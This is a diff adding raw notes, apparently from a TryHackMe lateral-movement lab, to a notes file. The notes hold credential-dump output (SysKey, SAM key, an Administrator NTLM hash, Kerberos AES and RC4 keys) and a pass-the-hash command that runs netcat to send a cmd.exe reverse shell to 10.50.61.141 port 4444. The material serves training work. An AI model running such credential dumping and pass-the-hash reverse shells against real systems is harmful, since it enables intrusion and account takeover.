@@ -36,3 +36,46 @@ SID               : S-1-5-21-3330634377-1326264276-632209373-4620
            rc4_hmac_old_exp  533f1bd576caa912bdb9da284bbc60fe                   
 
 
+
+
+Domain : THMJMP2                                                                
+SysKey : 2e27b23479e1fb1161a839f9800119eb                                       
+Local SID : S-1-5-21-1946626518-647761240-1897539217                            
+
+SAMKey : 9a74a253f756d6b012b7ee3d0436f77a                                       
+
+RID  : 000001f4 (500)                                                           
+User : Administrator                                                            
+  Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7                                   
+
+RID  : 000001f5 (501)                                                           
+User : Guest                                                                    
+
+RID  : 000001f7 (503)                                                           
+User : DefaultAccount    
+
+
+
+sekurlsa::pth /user:t1_toby.beck5 /domain:za.tryhackme.com /ntlm:0b2571be7e75e3dbd169ca5352a2dad7 /run:"c:\tools\nc64.exe -e cmd.exe 10.50.61.141 4444"
+
+
+ekeys:
+
+Authentication Id : 0 ; 611363 (00000000:00095423)                              
+Session           : RemoteInteractive from 4                                    
+User Name         : t1_toby.beck1                                               
+Domain            : ZA                                                          
+Logon Server      : THMDC                                                       
+Logon Time        : 11/21/2022 2:40:07 PM                                       
+SID               : S-1-5-21-3330634377-1326264276-632209373-4616               
+
+         * Username : t1_toby.beck1                                             
+         * Domain   : ZA.TRYHACKME.COM                                          
+         * Password : (null)                                                    
+         * Key List :                                                           
+           aes256_hmac       9518f416081dad28852ee95aba89ed79398fc39ae6f827393a7dcb692cfa0183                                                                   
+           rc4_hmac_nt       533f1bd576caa912bdb9da284bbc60fe                   
+           rc4_hmac_old      533f1bd576caa912bdb9da284bbc60fe                   
+           rc4_md4           533f1bd576caa912bdb9da284bbc60fe                   
+           rc4_hmac_nt_exp   533f1bd576caa912bdb9da284bbc60fe                   
+           rc4_hmac_old_exp  533f1bd576caa912bdb9da284bbc60fe 
